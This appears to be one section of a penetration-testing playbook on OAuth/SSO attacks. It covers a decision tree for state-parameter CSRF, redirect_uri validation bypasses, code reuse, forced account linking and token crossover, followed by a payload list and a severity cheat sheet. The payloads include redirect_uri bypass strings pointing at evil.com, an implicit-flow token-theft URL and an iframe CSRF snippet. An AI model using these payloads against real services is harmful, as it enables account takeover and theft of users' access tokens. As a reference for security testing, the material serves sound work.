# §22 OAuth/SSO Authorization Attacks
### 识别信号
- Login via third-party (WeChat/QQ/GitHub/Google/Apple) — `/oauth/authorize`, `/connect/qrconnect`, `/sso/login`
- URL params: `client_id`, `redirect_uri`, `response_type=code`, `scope`, `state`
- OAuth callback endpoint: `/callback`, `/afterauth`, `/oauth/callback`
- SSO token in response: `access_token=`, `id_token=`

### 决策流程
```
OAuth/SSO detected?
├── Step1: State parameter check (CSRF)
│   ├── Missing state param → CRITICAL CSRF ✅
│   │   → Attacker initiates OAuth → gets own code → forces victim to use attacker's code
│   │   → Victim logs in but uses attacker's account → attacker can access victim's actions
│   └── State present → check if validated server-side
│
├── Step2: redirect_uri validation
│   ├── Full redirect_uri accepted (no whitelist) → CRITICAL code interception ✅
│   │   → redirect_uri=https://evil.com → code sent to attacker
│   ├── Partial match bypass:
│   │   → redirect_uri=https://target.com.evil.com (suffix bypass)
│   │   → redirect_uri=https://target.com/callback?next=https://evil.com (open redirect chain)
│   │   → redirect_uri=https://target.com@evil.com (@ bypass)
│   └── Strict whitelist → move to Step3
│
├── Step3: Code/Token reuse & interception
│   ├── Authorization code reused? → exchange same code twice → both succeed?
│   ├── Code not bound to client_id? → get code for client_A → redeem with client_B secret
│   ├── Implicit flow: access_token in URL fragment (#access_token=...)
│   │   → redirect_uri with open redirect → token leaks to attacker
│   └── PKCE missing? → code can be intercepted + used by any client
│
├── Step4: Forced profile linking (CSRF + no confirmation)
│   ├── Bind social account without re-authentication?
│   │   → GET /oauth/linking?code=ATTACKER_CODE → CSRF → bind attacker's social account
│   │   → Attacker can now login via social account → account takeover
│   └── Bind without explicit user consent?
│       → QR code → victim scans → automatically bound → CSRF account takeover
│
└── Step5: Post-login token reuse (mini-program/web crossover)
    ├── Get mini-program token → use on web → same permissions? higher?
    ├── Get web session/token → use on mini-program API → bypass auth?
    └── Different OAuth providers → same user → session merge issues?
```

### Payload
```
redirect_uri bypass patterns:
  https://evil.com                                        (full control)
  https://target.com.evil.com                             (suffix match)
  https://evil.com/target.com                             (prefix match)
  https://target.com/callback?redirect=https://evil.com   (open redirect chain)
  https://target.com@evil.com                             (@ bypass)
  https://target.com%00.evil.com                          (null byte)

Implicit flow token theft:
  If open redirect exists on callback page:
    https://target.com/callback?next=https://evil.com#access_token=TOKEN
    → Browser follows redirect WITH fragment → evil.com gets token

Missing state CSRF exploit:
  <iframe src="https://provider.com/oauth/authorize?client_id=CLIENT
    &redirect_uri=CALLBACK&response_type=code&scope=profile">
  → Victim loads iframe → authorized → code sent to CALLBACK
  → Attacker uses code → logs into victim's account on attacker's device
```

### 快速判断速查

```
❌ No state param + no CSRF protection on callback → CRITICAL
❌ redirect_uri not validated → CRITICAL (code theft)
⚠️ state present but not verified server-side → HIGH (CSRF still possible)
⚠️ PKCE not enforced → HIGH (code interception)
⚠️ No re-auth for social account binding → HIGH (forced linking)
⚠️ Implicit flow + open redirect → HIGH (access_token leak)
```

---
